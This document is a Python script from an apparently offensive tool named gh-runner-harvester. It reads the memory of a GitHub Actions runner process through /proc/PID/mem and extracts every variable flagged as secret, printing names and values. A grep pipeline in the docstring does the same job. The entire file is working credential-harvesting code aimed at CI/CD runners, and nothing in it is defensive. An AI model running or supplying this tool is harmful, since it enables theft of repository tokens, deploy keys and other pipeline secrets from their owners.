#!/usr/bin/env python3
"""
gh-runner-harvester - memdump.py

Lightweight alternative to the dotnet-dump + frida flow. Instead of parsing
managed heap structures, this scrapes the runner process memory for the JSON
serialization of its Variables and prints every secret it finds.

It matches entries shaped like:

    "SECRET_NAME":{"value":"s3cr3t","isSecret":true}

Usage:
    sudo python3 memdump.py            # auto-detect Runner.Listener PID
    sudo python3 memdump.py 12345      # explicit PID

Historically this was a dumb memory dumper piped through tr/grep:

    sudo python3 memdump.py | tr -d '\\0' | \\
        grep -Eao '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}'

It now does the matching itself, but the raw output mode (RAW=1) is kept for
that pipeline.
"""

import os
import re
import subprocess
import sys

# "key":{"value":"...","isSecret":true}
SECRET_RE = re.compile(
    rb'"([^"]+)":\{"value":"([^"]*)","isSecret":true\}'
)


def find_pid():
    """Locate the Runner.Listener PID via ps."""
    try:
        out = subprocess.check_output(
            ["ps", "-eo", "pid,args"], text=True, stderr=subprocess.DEVNULL
        )
    except (subprocess.SubprocessError, FileNotFoundError):
        return None
    for line in out.splitlines():
        if "Runner.Listener" in line:
            parts = line.split(None, 1)
            if parts and parts[0].isdigit():
                pid = int(parts[0])
                if pid != os.getpid():
                    return pid
    return None


def readable_regions(pid):
    """Yield (start, end) for readable anonymous/file regions of a process."""
    maps_path = "/proc/{}/maps".format(pid)
    with open(maps_path, "r") as fh:
        for line in fh:
            fields = line.split()
            if len(fields) < 2:
                continue
            perms = fields[1]
            if "r" not in perms:
                continue
            start_s, end_s = fields[0].split("-")
            yield int(start_s, 16), int(end_s, 16)


def dump_memory(pid):
    """Yield raw bytes chunks from the target process memory."""
    try:
        mem = open("/proc/{}/mem".format(pid), "rb", buffering=0)
    except OSError as exc:
        sys.stderr.write(
            "[-] Cannot open /proc/{}/mem: {} (run as root)\n".format(pid, exc)
        )
        sys.exit(1)

    with mem:
        for start, end in readable_regions(pid):
            # Skip implausibly huge mappings to stay responsive.
            if end - start > 512 * 1024 * 1024:
                continue
            try:
                mem.seek(start)
                yield mem.read(end - start)
            except OSError:
                continue


def main():
    if len(sys.argv) > 1:
        pid = int(sys.argv[1])
    else:
        pid = find_pid()
        if pid is None:
            sys.stderr.write("[-] Could not find Runner.Listener PID.\n")
            sys.exit(1)

    raw_mode = os.environ.get("RAW") == "1"

    seen = set()
    for chunk in dump_memory(pid):
        if raw_mode:
            # Compatible with the old `| tr -d '\0' | grep ...` pipeline.
            sys.stdout.buffer.write(chunk)
            continue
        for match in SECRET_RE.finditer(chunk):
            name = match.group(1).decode("utf-8", "replace")
            value = match.group(2).decode("utf-8", "replace")
            if (name, value) in seen:
                continue
            seen.add((name, value))
            print("- {}: {}".format(name, value))


if __name__ == "__main__":
    main()
